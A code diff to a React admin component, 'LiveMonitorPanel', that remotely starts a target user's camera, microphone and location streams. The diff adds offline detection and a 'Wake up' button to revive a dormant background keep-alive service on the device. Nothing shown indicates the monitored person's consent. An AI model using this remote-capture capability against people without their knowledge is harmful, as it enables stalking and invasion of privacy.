@@ -55,7 +55,7 @@ function rmsLevel(base64) {
   } catch { return 0 }
 }
 
-export default function LiveMonitorPanel({ targetUser, adminId, sendMsg, addListener }) {
+export default function LiveMonitorPanel({ targetUser, adminId, sendMsg, addListener, onWakeUp }) {
   // ── Camera state ────────────────────────────────────────────────
   const [camActive,  setCamActive]  = useState(false)
   const [camStatus,  setCamStatus]  = useState('idle') // idle | connecting | live | error
@@ -75,6 +75,18 @@ export default function LiveMonitorPanel({ targetUser, adminId, sendMsg, addList
   const [locActive, setLocActive] = useState(false)
   const [location,  setLocation]  = useState(null)
 
+  // KeepAliveService is dormant by default now, so any of the three actions above can come
+  // back "offline" rather than just timing out — one shared banner covers all three rather
+  // than duplicating the same prompt in each section.
+  const [deviceOffline, setDeviceOffline] = useState(false)
+  const [waking, setWaking] = useState(false)
+
+  const handleWakeUp = () => {
+    setWaking(true)
+    onWakeUp?.(targetUser.id)
+    setTimeout(() => setWaking(false), 4000)
+  }
+
   // ── Cleanup on unmount ───────────────────────────────────────────
   useEffect(() => {
     return () => {
@@ -89,6 +101,16 @@ export default function LiveMonitorPanel({ targetUser, adminId, sendMsg, addList
   // ── Message listener ─────────────────────────────────────────────
   useEffect(() => {
     return addListener((msg) => {
+      // Not keyed by fromUserId — this is a synthesized reply for a target that was never
+      // connected, so there's no fromUserId to match; the server names the targeted userId.
+      if (msg.type === 'target_offline' && msg.userId === targetUser.id) {
+        setDeviceOffline(true)
+        if (msg.action === 'start_camera') { setCamActive(false); setCamStatus('error') }
+        if (msg.action === 'start_mic') { setMicActive(false); setMicStatus('idle') }
+        if (msg.action === 'start_location') { setLocActive(false) }
+        return
+      }
+
       if (msg.fromUserId !== targetUser.id) return
 
       // JPEG path — native Android background service fallback
@@ -116,6 +138,7 @@ export default function LiveMonitorPanel({ targetUser, adminId, sendMsg, addList
 
   // ── Camera controls ──────────────────────────────────────────────
   const startCamera = useCallback(async (facing) => {
+    setDeviceOffline(false)
     clearTimeout(camTimer.current)
     if (lkRoomRef.current) { lkRoomRef.current.disconnect(); lkRoomRef.current = null }
     if (videoRef.current) videoRef.current.srcObject = null
@@ -191,6 +214,7 @@ export default function LiveMonitorPanel({ targetUser, adminId, sendMsg, addList
         nextPlayAt = 0
       }
       audioCtx.resume()
+      setDeviceOffline(false)
       sendMsg({ type: 'start_mic', targetId: targetUser.id })
       setMicActive(true); setMicStatus('connecting')
     }
@@ -202,6 +226,7 @@ export default function LiveMonitorPanel({ targetUser, adminId, sendMsg, addList
       sendMsg({ type: 'stop_location', targetId: targetUser.id })
       setLocActive(false)
     } else {
+      setDeviceOffline(false)
       sendMsg({ type: 'start_location', targetId: targetUser.id })
       setLocActive(true)
     }
@@ -214,6 +239,15 @@ export default function LiveMonitorPanel({ targetUser, adminId, sendMsg, addList
   return (
     <div className="live-panel">
       <div className="live-panel-title">📡 Live Monitor — {targetUser.name}</div>
+
+      {deviceOffline && (
+        <div className="live-offline-banner">
+          <span>{targetUser.name}'s device is offline — it'll only take a few seconds to reconnect once woken up.</span>
+          <button className="rb-wake-btn" onClick={handleWakeUp} disabled={waking}>
+            {waking ? 'Waking…' : '🔔 Wake up'}
+          </button>
+        </div>
+      )}
 
       {/* ── Camera ── */}
       <div className="live-section">
